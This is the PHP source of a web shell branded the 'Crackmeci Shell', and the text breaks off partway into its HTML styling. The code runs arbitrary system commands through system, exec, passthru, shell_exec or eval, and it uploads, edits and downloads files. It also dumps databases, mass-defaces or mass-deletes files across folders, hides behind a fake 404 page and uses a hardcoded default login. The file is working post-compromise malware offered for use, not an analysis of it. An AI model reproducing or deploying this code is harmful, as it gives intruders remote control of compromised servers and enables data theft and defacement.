<?php 

set_time_limit(0);
error_reporting(0);

session_start();
session_regenerate_id();
$systemLang = isset($_SESSION["language"]) ? $_SESSION["language"] : "en";
$languages["en"] = [
    "about_button" => "About Me",
    "server_text" => "Server Info",
    "safe_modeText" => "Safe Mode",
    "disk_statusText" => "Disk Space",
    "apache_text" => "Apache Version",
    "groups" => "Groups",
    "server_ipText" => "Server IP",
    "your_ipText" => "Your IP",
    "navigation_homeText" => "Home",
    "navigation_uploadText" => "Upload",
    "navigation_phpInfoText" => "PHPInfo",
    "navigation_executeText" => "Execute",
    "navigation_sqlText" => "SQL Manager",
    "navigation_encryptText" => "Encrypt",
    "navigation_createLogin" => "Set Login",
    "fileManager_editPage_title" => "File Content",
    "fileManager_editPage_btnText" => "Update File!",
    "fileManager_title" => "File Manager",
    "fileManager_name" => "Name",
    "fileManager_size" => "Size",
    "fileManager_owner" => "Owner User-Group",
    "fileManager_permissions" => "Permissions",
    "fileManager_modified" => "Modified",
    "fileManager_actions" => "Actions",
    "uploadPage_title" => "Upload File",
    "uploadPage_btnText" => "Upload!",
    "executePage_btnText" => "Execute!",
    "sqlManager_title" => "SQL Connection",
    "sqlManager_hostHolder" => "Server Adress",
    "sqlManager_sqlUser" => "SQL Username",
    "sqlManager_sqlPassword" => "Password",
    "sqlManager_connectBtn" => "Connect!",
    "sqlManager_executeQuery" => "Write your sql query",
    "sqlManager_executeBtn" => "Execute Query",
    "encryptPage_title" => "Encrypt",
    "encryptPage_btnText" => "Encrypt!",
    "general_onText" => "ON",
    "general_offText" => "OFF",
    "aboutPage_mainText" => "This shell has been developed by Crackmeci.",
    "sql_notFound" => "No data found to display!",
    "file_notExists" => "File is not exists",
    "file_updateSuccess" => "File has updated with success",
    "file_uploaded" => "File has uploaded with success",
    "file_uploadedError" => "An error occurred while uploading the file",
    "fileManager_viewPage_title" => "View File",
    "command_errorText" => "An error occured while executing command!",
    "command_successText" => "Command has executed with success!",
    "encrypt_successText" => "Text encrypted with success!",
    "encrypt_errorText" => "An error occured while executing command!",
    "view_page_renameBtn" => "Rename!",
    "view_renameSuccessText" => "Renamed the file name with success!",    
    "view_renameErrorText" => "An error occured while renaming file!",
    "login_userText" => "Username",
    "login_passText" => "Password",
    "login_btnText" => "Login!",
    "login_title" => "Login",
    "notFound_header" => "404 Not Found",
    "goBack_text" => "Go Back!",
    "comeIn_btn" => "Come In!",
    "theme_default" => "Default",
    "theme_alternative" => "Alternative",
    "shellRemover_pageTitle" => "Shell Remover",
    "shellRemover_folderPath" => "Folder Path",
    "shellRemover_btnText" => "Find and Remove Shells",
    "shellRemove_delete" => "Delete File",
    "shellRemover_noticeText" => "This file is most likely a shell, but it's still good to check.",
    "shellRemover_filePath" => "File Path",
    "shellRemover_foundTitle" => "Found Shells",
    "shellRemover_deleteAll" => "Delete All",
    "shellRemover_saveInfo" => "The names of the found shells have been saved to a file named finded_shell.txt.",
    "sqlManager_exportDb" => "Export Database",
    "massDeface_pageTitle" => "Mass Deface",
    "massDeface_folderPath" => "Folder Path",
    "massDeface_fileName" => "File Name",
    "massDeface_fileContent" => "File Content",
    "massDeface_btnText" => "Mass Deface!",
    "massDeface_fromText" => "Get from text",
    "massDeface_fromFile" => "Get from file",
    "massDeface_deleteText" => "Delete as multiple",
    "massDeface_noticeText" => 'If your action is a bulk deletion, you don\'t need to select either "Get from file" or "Get from text" since data won\'t be taken from a file!',
    "fileManager_createFile" => "File to create",
    "fileManager_createFolder" => "Folder to create",
    "fileManager_createFileBtn" => "Create File!",
    "fileManager_createFolderBtn" => "Create Folder!",
    "deleteYou_pageTitle" => "Delete Yourself",
    "deleteYou_btnText" => "Destroy Yourself!",
    "deleteYou_confirmation" => "Are you sure you want to delete me?"
] ;

$languages["tr"] = [
    "about_button" => "Hakkımda",
    "apache_text" => "Apache Sürümü",
    "server_text" => "Sunucu Bilgisi",
    "safe_modeText" => "Güvenli Mod",
    "disk_statusText" => "Disk Alanı",
    "groups" => "Gruplar",
    "server_ipText" => "Sunucu IP",
    "your_ipText" => "IP Adresiniz",
    "navigation_homeText" => "Anasayfa",
    "navigation_uploadText" => "Yükle",
    "navigation_phpInfoText" => "PHP Bilgisi",
    "navigation_executeText" => "Çalıştır",
    "navigation_sqlText" => "SQL Yöneticisi",
    "navigation_encryptText" => "Şifrele",
    "navigation_createLogin" => "Giriş Ayarla",
    "fileManager_title" => "Dosya Yöneticisi",
    "fileManager_name" => "Ad",
    "fileManager_size" => "Boyut",
    "fileManager_owner" => "Sahip Kullanıcı-Grup",
    "fileManager_permissions" => "İzinler",
    "fileManager_modified" => "Değiştirilme Tarihi",
    "fileManager_actions" => "İşlemler",
    "fileManager_editPage_title" => "Dosya İçeriği",
    "fileManager_editPage_btnText" => "Dosyayı Güncelle!",
    "uploadPage_title" => "Dosya Yükleme",
    "uploadPage_btnText" => "Yükle!",
    "executePage_btnText" => "Çalıştır!",
    "sqlManager_title" => "SQL Bağlantısı",
    "sqlManager_hostHolder" => "Sunucu Adresi",
    "sqlManager_sqlUser" => "SQL Kullanıcı Adı",
    "sqlManager_sqlPassword" => "Şifre",
    "sqlManager_connectBtn" => "Bağlan!",
    "sqlManager_executeQuery" => "SQL sorgunuzu yazın",
    "sqlManager_executeBtn" => "Sorguyu Çalıştır",
    "encryptPage_title" => "Şifrele",
    "encryptPage_btnText" => "Şifrele!",
    "general_onText" => "AÇIK",
    "general_offText" => "KAPALI",
    "aboutPage_mainText" => "Bu webshell Crackmeci tarafından geliştirilmiştir",
    "sql_notFound" => "Görüntülenecek veri bulunamadı!",
    "file_notExists" => "Dosya Bulunamadı",
    "file_updateSuccess" => "Dosya başarıyla güncellendi!",
    "file_uploaded" => "Dosya başarıyla yüklendi",
    "file_uploadedError" => "Dosya yüklenirken bir hata oluştu",
    "fileManager_viewPage_title" => "Dosyayı Görüntüle",
    "command_errorText" => "Komut çalıştırılırken bir hata oluştu!",
    "command_successText" => "Komut başarıyla çalıştırıldı!",
    "encrypt_successText" => "Metin başarıyla şifrelendi!",
    "encrypt_errorText" => "Metin şifrelenirken bir hata oluştu!",
    "view_page_renameBtn" => "Yeniden Adlandır!",
    "view_renameSuccessText" => "Dosya başarıyla yeniden adlandırıldı!",    
    "view_renameErrorText" => "Dosya yeniden isimlendirilirken bir hata oluştu!",
    "login_userText" => "Kullanıcı Adı",
    "login_passText" => "Şifre",
    "login_btnText" => "Giriş Yap!",
    "login_title" => "Giriş Yap",
    "notFound_header" => "404 Bulunamadı",
    "goBack_text" => "Geri Dön!",
    "comeIn_btn" => "İçeri Gel!",
    "theme_default" => "Varsayılan",
    "theme_alternative" => "Alternatif",
    "shellRemover_pageTitle" => "Shell Silici",
    "shellRemover_folderPath" => "Klasör Yolu",
    "shellRemover_btnText" => "Shelleri bul ve sil",
    "shellRemove_delete" => "Dosyayı Sil",
    "shellRemover_noticeText" => "Bu dosya büyük ihtimalle bir shell ancak gene de kontrol ederseniz iyi olur.",
    "shellRemover_filePath" => "Dosya İsmi",
    "shellRemover_foundTitle" => "Bulunan Sheller",
    "shellRemover_deleteAll" => "Tümünü Sil",
    "shellRemover_saveInfo" => "Bulunan shellerin isimleri finded_shell.txt isimli dosyaya kaydedildi",
    "sqlManager_exportDb" => "Veritabanını Dışa Aktar",
    "massDeface_pageTitle" => "Toplu Deface Etme",
    "massDeface_folderPath" => "Klasör Yolu",
    "massDeface_fileName" => "Dosya İsmi",
    "massDeface_fileContent" => "Dosya İçeriği",
    "massDeface_btnText" => "Toplu Deface Et!",
    "massDeface_fromText" => "Yazıdan Getir",
    "massDeface_fromFile" => "Dosyadan Getir",
    "massDeface_deleteText" => "Toplu olarak sil",
    "massDeface_noticeText" => 'Eğer yapacağınız işlem toplu silme işlemiyse bir dosyadan veri alınmayacağı için "Dosyadan getir" veya "Yazıdan getir" seçeneklerinden birini seçmenize gerek yoktur!',
    "fileManager_createFile" => "Oluşturulacak dosya",
    "fileManager_createFolder" => "Oluşturulacak klasör",
    "fileManager_createFileBtn" => "Dosyayı Oluştur!",
    "fileManager_createFolderBtn" => "Klasörü Oluştur!",
    "deleteYou_pageTitle" => "Kendini Sil",
    "deleteYou_btnText" => "Kendini İmha Et!",
    "deleteYou_confirmation" => "Beni silmek istediğinizden emin misiniz?"
];



?>

<?php
function get_perms($file)
{
    if ($mode = @fileperms($file)) {
        $perms = "";
        $perms .= $mode & 00400 ? "r" : "-";
        $perms .= $mode & 00200 ? "w" : "-";
        $perms .= $mode & 00100 ? "x" : "-";
        $perms .= $mode & 00040 ? "r" : "-";
        $perms .= $mode & 00020 ? "w" : "-";
        $perms .= $mode & 00010 ? "x" : "-";
        $perms .= $mode & 00004 ? "r" : "-";
        $perms .= $mode & 00002 ? "w" : "-";
        $perms .= $mode & 00001 ? "x" : "-";
        return $perms;
    } else {
        return "??????????";
    }
}

function downloadFile($filePath) {
    if (file_exists($filePath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filePath));
        readfile($filePath);
        exit;
    } 

    return 0;
}

function getFileIcon($file) {
    $extension = pathinfo($file, PATHINFO_EXTENSION);
    switch ($extension) {
        case 'txt':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/text.png';        
        case 'html':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/html.png';        
        case 'htaccess':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/htaccess.svg';        
        case 'ini':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/ini.png';        
        case 'db':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/db.png';
        case 'json':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/json.png';
        case 'png':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/png.png';
        case 'jpeg':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/jpeg.png';
        case 'gif':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/gif.png';
        case 'css':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/css.png';
        case 'rar':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/rar.png';        
        case 'lnk':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/lnk.png';
        case 'js':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/javascript.png';        
        case 'ico':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/ico.png';        
        case 'dll':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/dll.png';        
        case 'exe':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/exe.png';        
        case 'manifest':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/manifest.svg';        
        case 'bat':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/bat.png';
        case 'dat':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/dat.png';        
        case 'log':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/log.png';
        case 'pdf':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/pdf.svg';
        case 'php':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/php.svg';
        case 'phtml':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/php.svg';
        case 'py':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/python.png';        
        case 'pyd':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/python.png';
        case 'rb':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/ruby.png';
        case 'pl':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/perl.png';
        case 'doc':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/word.png';
        case 'docx':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/word.png';
        case 'xlsx':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/excel.png';        
        case 'xlsm':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/excel.png';        
        case 'xlsb':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/excel.png';        
        case 'xltx':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/excel.png';        
        case 'xls':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/excel.png';        
        case 'ppt':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/powerpoint.png';        
        case 'pptx':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/powerpoint.png';        
        case 'sql':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/sql.png';
        case 'xml':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/xml.png';
        case 'sh':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/sh.png';
        case 'zip':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/zip.svg';        
        case 'gz':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/gz.png';        
        case 'tar.gz':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/tgz.png';
        case 'avi':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/avi.png';
        case 'mp4':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/mp4.png';
        case 'otf':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/otf.png';
        case 'ttf':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/ttf.png';
        case 'waw':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/waw.png';
        case 'mp3':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/mp3.png';        
        case 'cgi':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/cgi.png';
        default:
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/file.png';
    }
}

function formatFileSize($size) {
    if ($size >= 1024 * 1024 * 1024) {
        return number_format($size / (1024 * 1024 * 1024), 2) . " GB";
    } elseif ($size >= 1024 * 1024) {
        return number_format($size / (1024 * 1024), 2) . " MB";
    } elseif ($size >= 1024) {
        return number_format($size / 1024, 2) . " KB";
    } else {
        return $size . " Bytes";
    }
}

function scanningDir($dir){
    $scan = $dir;
    if(!is_dir($dir)){
        $scan = ".";
    }

    $tmp = [];
    $files = [];
    $directories = [];

    
    $alls = scandir($scan);
    
    foreach($alls as $one){
        $fullPath = realpath($scan . DIRECTORY_SEPARATOR . $one);

        if(is_file($fullPath)){
            array_push($files,$one);
        }else if(is_dir($fullPath) && $one != "." && $one != ".."){
            array_push($directories,$one);
        }
    }

    $tmp["files"] = $files;
    $tmp["directories"] = $directories;

    return $tmp;
}

function getOwnerGroup($path) {
    if(function_exists("posix_getpwuid")){
        return posix_getpwuid(fileowner($path))['name'] . " - " . posix_getgrgid(filegroup($path))['name'];
    }else{
        $owner = fileowner($path);
        $group = filegroup($path);
    
        $owner_name = fileowner($path);
        $group_name = filegroup($path);
    
        return $owner_name . " - " . $group_name;
    }
}

function createAndDownloadFolder($folderPath) {
    $targetFile = basename($folderPath);

    $phar = new PharData($targetFile . '.tar');
    $phar->buildFromDirectory($folderPath);

    $gzipped = gzopen($targetFile . '.tar.gz', 'w9');
    gzwrite($gzipped, file_get_contents($targetFile . '.tar'));
    gzclose($gzipped);

    unlink($targetFile . '.tar');
    
    header('Content-Type: application/x-gzip');
    header('Content-Disposition: attachment; filename="' . $targetFile . '.tar.gz"');

    readfile($targetFile . '.tar.gz');

    unlink($targetFile . '.tar.gz');
}

function simpleText($text)
{
    if (!get_magic_quotes_gpc()) {
        return $text;
    }
    return stripslashes($text);
}


function checkActive($href) {
    $currentUrl = $_SERVER["REQUEST_URI"];
    $tmp = 0;

    if (is_array($href)) {
        foreach ($href as $h) {
            if (stripos($currentUrl, $h) !== false) {
                $tmp++;
            }
        }

        if ($tmp > 0) {
            return true;  
        }
    } else {
        return stripos($currentUrl, $href) !== false;
    }

    return false; 
}


function getActive($navs) {
    $currentUrl = $_SERVER["REQUEST_URI"];

    foreach ($navs as $nav) {
        if (is_array($nav['href'])) {
            foreach ($nav['href'] as $href) {
                if (stripos($currentUrl, $href) !== false) {
                    return $nav;
                }
            }
        } else {
            if (stripos($currentUrl, $nav['href']) !== false) {
                return $nav;
            }
        }
    }

    return $navs[0];
}


function useOne($arr){
    if(is_array($arr)){
        return $arr[0];
    }

    return $arr;
}


function executeCommand($cmd)
{
    $outputBuffer = "";

    if (function_exists("system")) {
        @ob_start();
        @system($cmd);
        $outputBuffer = @ob_get_contents();
        @ob_end_clean();
    } elseif (function_exists("exec")) {
        @exec($cmd, $results);
        $outputBuffer = implode("", $results);
    } elseif (function_exists("passthru")) {
        @ob_start();
        @passthru($cmd);
        $outputBuffer = @ob_get_contents();
        @ob_end_clean();
    } elseif (function_exists("shell_exec")) {
        $outputBuffer = @shell_exec($cmd);
    }else if(function_exists("eval")){
        $outputBuffer = @eval($cmd);
    }
    

    return $outputBuffer;
}

function createNavigation(){
    $dir = __DIR__;

    $parts = explode(DIRECTORY_SEPARATOR, $dir);

    $parts = array_filter($parts);

    return $parts;
}

function getPreviousAndImplode($arr,$index){
    if(count($arr) == 1) { return $arr[0]; }
    $tmp = [];
    $i = 0;
    foreach($arr as $part){
        $tmp[] = $part;
        if($i == $index){ break; }
        $i++;
    }

    return implode(DIRECTORY_SEPARATOR,$tmp);
}

class SQLManager {
    private $host;
    private $user;
    private $pass;
    private $db;
    private $charset;  

    public function __construct($host, $user, $pass, $charset = 'utf8') {
        $this->host = $host;
        $this->user = $user;
        $this->pass = $pass;
        $this->charset = $charset;
        $this->connect();
    }

    private function connect() {
        try {
            $dsn = "mysql:host={$this->host};charset={$this->charset};";  // Added charset to DSN
            $options = [
                PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                PDO::ATTR_EMULATE_PREPARES   => false,
            ];

            $this->db = new PDO($dsn, $this->user, $this->pass, $options);
        } catch (PDOException $e) {
            die("Connection failed: " . $e->getMessage());
        }
    }

    public function disconnect() {
        $this->db = null;
    }

    public function query($sql, $params = []) {
        try {
            $stmt = $this->db->prepare($sql);
            $stmt->execute($params);
            return $stmt;
        } catch (PDOException $e) {
            die("Query failed: " . $e->getMessage());
        }
    }

    public function fetchAll($sql, $params = []) {
        $stmt = $this->query($sql, $params);
        return $stmt->fetchAll();
    }

    public function fetch($sql, $params = []) {
        $stmt = $this->query($sql, $params);
        return $stmt->fetch();
    }


    public function fetchColumns($tableName, $params = []) {
        $sql = "SELECT * FROM $tableName";
        $stmt = $this->query($sql, $params);
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }

    public function showDatabases() {
        $sql = "SHOW DATABASES";
        $result = $this->fetchAll($sql);
        $databases = [];

        foreach ($result as $row) {
            $databases[] = $row['Database'];
        }

        return $databases;
    }

    public function showTables() {
        $sql = "SHOW TABLES";
        $result = $this->fetchAll($sql);
        $tables = [];

        foreach ($result as $row) {
            $tables[] = $row['Tables_in_' . $this->getCurrentDatabase()];  // Corrected column name
        }

        return $tables;
    }

    public function selectDatabase($database) {
        $this->disconnect(); 
        $this->connect();    
        $this->db->exec("USE `$database`");
    }

    public function getCurrentDatabase() {
        $stmt = $this->query("SELECT DATABASE()");
        return $stmt->fetchColumn();
    }

    public function createDatabaseDump($dumpFilePath) {
        try {
            $tables = $this->showTables();

            $fileHandle = fopen($dumpFilePath, 'w');

            foreach ($tables as $table) {
                $tableStructure = $this->getTableStructure($table);
                $tableData = $this->fetchAll("SELECT * FROM {$table}");

                fwrite($fileHandle, "-- Table structure for table {$table}\n{$tableStructure};\n\n");

                foreach ($tableData as $row) {
                    $rowValues = implode(', ', array_map(function ($value) {
                        return $this->db->quote($value);
                    }, $row));
                    fwrite($fileHandle, "INSERT INTO {$table} VALUES ({$rowValues});\n");
                }

                fwrite($fileHandle, "\n");
            }

            fclose($fileHandle);

        } catch (PDOException $e) {
            die($e->getMessage());
        }
    }

    private function getTableStructure($tableName) {
        $sql = "SHOW CREATE TABLE $tableName";
        $stmt = $this->query($sql);
        return $stmt->fetch(PDO::FETCH_ASSOC)['Create Table'];
    }
}



function generateInputField($placeholder, $name, $iconClass, $type = "text",$value="",$id="")
{
    return '<div class="flex mt-2" id='.$id.'>
        <div class="prepend flex gap-2 bg-blue-500 min-w-[42px] items-center justify-center p-3">
            <i class="fa '.$iconClass.' text-lg text-white"></i>
        </div>
        <input class="p-2 w-full  border-none outline-none" value="'.$value.'" type="'.$type.'" name="'.$name.'" placeholder="'.$placeholder.'" id="'.$name.'">
    </div>';
}

function generateTextareaField($placeholder, $name, $iconClass, $value = "", $id = "")
{
    return '<div class="flex mt-2" id="' . $id . '">
        <div class="prepend flex gap-2 bg-blue-500 min-w-[42px] items-center justify-center p-3">
            <i class="fa ' . $iconClass . ' text-lg text-white"></i>
        </div>
        <textarea class="p-2 w-full border-none outline-none" name="' . $name . '" placeholder="' . $placeholder . '" id="' . $name . '">' . $value . '</textarea>
    </div>';
}



function appendDatabaseParam($url, $database) {
    $paramNameDatabase = 'database';
    $paramNameTable = 'table';
    $encodedDatabase = urlencode($database);

    $url = preg_replace("/[?&]{$paramNameDatabase}=[^&]*/", '', $url);
    $url = preg_replace("/[?&]{$paramNameTable}=[^&]*/", '', $url);

    if (!empty($database)) {
        $url .= (strpos($url, '?') === false) ? '?' : '&';
        $url .= "{$paramNameDatabase}={$encodedDatabase}";
    }

    return $url;
}


function appendTableParam($url, $table) {
    $paramName = 'table';
    $encodedTable = urlencode($table);

    if (strpos($url, "{$paramName}=") !== false) {
        $url = preg_replace("/{$paramName}=[^&]*/", "{$paramName}={$encodedTable}", $url);
    } else {
        $url .= (strpos($url, '?') === false) ? '?' : '&';
        $url .= "{$paramName}={$encodedTable}";
    }

    return $url;
}

function encryptText($text, $type) {
    switch ($type) {
        case 'rot13':
            return str_rot13($text);
        case 'base64':
            return base64_encode($text);
        case 'md5':
            return md5($text);
        case 'sha256':
            return hash('sha256', $text);
        case 'sha1':
            return sha1($text);
        case 'url':
            return urlencode($text);
        default:
            return "";
    }
}


function scanFiles($folderPath) {
    $fileList = [];

    $files = scandir($folderPath);

    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            $filePath = $folderPath . DIRECTORY_SEPARATOR . $file;

            if (is_file($filePath)) {
                $fileList[] = $filePath;
            } elseif (is_dir($filePath)) {
                $subFolderFiles = scanFiles($filePath);
                $fileList = array_merge($fileList, $subFolderFiles);
            }
        }
    }

    return $fileList;
}


function defacingFiles($folderPath, $fileName) {
    $fileList = [];

    $files = scandir($folderPath);

    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            $filePath = $folderPath . DIRECTORY_SEPARATOR . $file;

            if (is_file($filePath)) {
                if (basename($filePath) == $fileName) {
                    $fileList[] = $filePath;
                }
            } elseif (is_dir($filePath)) {
                $subFolderFiles = defacingFiles($filePath, $fileName);
                $fileList = array_merge($fileList, $subFolderFiles);
            }
        }
    }

    return $fileList;
}



function findShells($file){
    $patterns = array(
        "base64_decode",
        "eval",
        "str_rot13",
        "shell_exec",
        "gzinflate",
        "multipart/form-data",
        '$_SESSION',
        "header",
        '$uoeq967',
        '$vpna644',
        '$vpna645',
        "phpshelldownload.com",
        "x67",
        "x4c",
        "'e'.'v'.'a'.'l'",
        "ZXZhbA==",
        'x4c\x4f',
        '"e"."v"."a"."l"',
        '"ev"."a"."l"',
        '"e"."va"."l"',
        '"e"."v"."al"',
        '"ev"."al"',
        '"eva"."l"',
        '"e"."val"',
        "'e'.'v'.'a'.'l'",
        "'ev'.'a'.'l'",
        "'e'.'va'.'l'",
        "'e'.'v'.'al'",
        "'ev'.'al'",
        "'eva'.'l'",
        "'e'.'val'",
        "b32mnrb23nmrb23mnrbmn32",
        "spamshell.xyz",
        "r57",
        "c99",
        "shellindir",
        "wso"
    );

    $content = file_get_contents($file);

    $count = 0;

    foreach ($patterns as $pattern) {
        if (substr_count($content, $pattern) !== 0) {
            $count++;
        }
    }

    if($count > 0){
        $write = "finded_shell.txt";
        $open = fopen($write,"a");
        fwrite($open,$file . "\n");
        fclose($open);

        return $file;
    }

    return 0;
}



?>


<?php 
    if(isset($_SESSION["user"])):
        if(isset($_POST["execute"]) && isset($_GET["ajax"]) && $_POST["command"]){
            if($_POST["command"] == ""){
                $data["response"] = "An error occurred while executing command!";
                $data["type"] = "error";
            }else{
                $data["response"] = executeCommand(trim($_POST["command"]));
                $data["type"] = $data["response"] != "" ? "success" : "error";
            }

            echo json_encode($data);
            exit();
        }else if(isset($_POST["encrypt"]) && isset($_GET["ajax"]) && isset($_POST["type"]) && isset($_POST["text"])){
            if($_POST["type"] != "" && $_POST["text"] != ""){
                $data["response"] = encryptText(trim($_POST["text"]),trim($_POST["type"]));
                $data["type"] = $data["response"] != "" ? "success" : "error";
            }else{
                $data["response"] = "An error occurred while encrypting text!";
                $data["type"] = "error";
            }
            
            echo json_encode($data);
            exit();
        }
    endif;
?>

<?php
    ob_start();

    try {
        $uid = posix_getuid();
        $gid = posix_getgid();
    } catch (Error $e) {
        $uid = getmyuid();
        $gid = getmygid();
    }

    try {
        if (function_exists('posix_getgroups')) {
            $groups = implode(',', posix_getgroups()); 
        } else {
            throw new Exception("posix_getgroups function is not available.");
    
            
        }
    } catch (Exception $e) {
        $groups = 0;
    }


    $config = [
        "user_ip" => $_SERVER["REMOTE_ADDR"],
        "server_ip" => gethostbyname($_SERVER["HTTP_HOST"]),
        "site_url" => "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"],
        "safe_mode" => @ini_get('safe_mode'),
        "mysql_status" => extension_loaded('mysql') || extension_loaded("mysqli") ? $languages[$systemLang]["general_onText"] : $languages[$systemLang]["general_offText"],
        "perl_status" => extension_loaded('perl') ? $languages[$systemLang]["general_onText"] : $languages[$systemLang]["general_offText"],
        "curl_status" => function_exists('curl_version') ? $languages[$systemLang]["general_onText"] : $languages[$systemLang]["general_offText"],
        "wget_status" => function_exists('shell_exec') && is_executable('/usr/bin/wget') ? $languages[$systemLang]["general_onText"] : $languages[$systemLang]["general_offText"],
        "apache_version" => function_exists('apache_get_version') ? apache_get_version() : "Server isn't apache",
        "server_info" =>  @php_uname(),
        "base_url" => basename(__FILE__),
        "disk_freeSpace" => disk_free_space('/'),
        "disk_totalSpace" => disk_total_space('/'),
        "username" => "admin", // login username
        "password" => "21232f297a57a5a743894a0e4a801fc3" // login password write as md5
    ];

    $navs = [
        [
            "name" => $languages[$systemLang]["navigation_homeText"],
            "href" => ["?page=home","?page=files"],
            "icon" => "fa fa-home",
            "code_name" => "home"
        ],
        [
            "name" => $languages[$systemLang]["navigation_uploadText"],
            "href" => "?page=upload",
            "icon" => "fas fa-cloud-upload-alt",
            "code_name" => "upload"
        ],
        [
            "name" => $languages[$systemLang]["navigation_phpInfoText"],
            "href" => "?page=phpinfo",
            "icon" => "fa-brands fa-php",
            "code_name" => "phpinfo"
        ],
        [
            "name" => $languages[$systemLang]["navigation_executeText"],
            "href" => "?page=execute",
            "icon" => "fa-solid fa-terminal",
            "code_name" => "execute"
        ],
        [
            "name" => $languages[$systemLang]["navigation_sqlText"],
            "href" => "?page=sqlManager",
            "icon" => "fa-solid fa-database",
            "code_name" => "sqlManager"
        ],

        [
            "name" => $languages[$systemLang]["navigation_encryptText"],
            "href" => "?page=encrypt",
            "icon" => "fa-solid fa-key",
            "code_name" => "encrypt"
        ],           
        
        [
            "name" => $languages[$systemLang]["shellRemover_pageTitle"],
            "href" => "?page=shellRemover",
            "icon" => "fa-solid fa-times",
            "code_name" => "shellRemover"
        ],   
        
        [
            "name" => $languages[$systemLang]["massDeface_pageTitle"],
            "href" => "?page=massDeface",
            "icon" => "fa-solid fa-file",
            "code_name" => "massDeface"
        ],      
        
        [
            "name" => $languages[$systemLang]["deleteYou_pageTitle"],
            "href" => "?page=deleteYou",
            "icon" => "fa-solid fa-trash",
            "code_name" => "deleteYou"
        ],   
        
    ];

    $navStyles = [
        "active" => "p-2 text-white font-semibold bg-blue-500 min-w-[60px] text-center text-sm",
        "normal" => "p-2 text-white font-semibold border-[1px] border-[rgba(255,255,255,0.1)] text-sm min-w-[60px] text-center"
    ];

    if(!isset($_GET["page"])){
        $_GET["page"] = "home";
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title><?php if(isset($_SESSION["first_stage"])){ echo "Crackmeci Shell - ".getActive($navs)["name"]; }else { echo $languages[$systemLang]["notFound_header"]; } ?> </title>
<?php if(isset($_SESSION["first_stage"])){ ?>
    <meta name="description" content="Crackmeci Shell">
    <meta name="keywords" content="crackmeci shell, crackmeci, shell">
    <link rel="icon" type="image/png" href="https://github.com/Crackmeci/shell/blob/main/favicon.png?raw=true" sizes="32x32" />
<?php } ?>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
    
    <?php if(isset($_SESSION["theme"]) && $_SESSION["theme"] == "alternative"): ?>
        <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
    <?php endif; ?>

    <?php if(isset($_SESSION["first_stage"])): ?>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@100;300;400;500;600;700;800;900&display=swap');
            
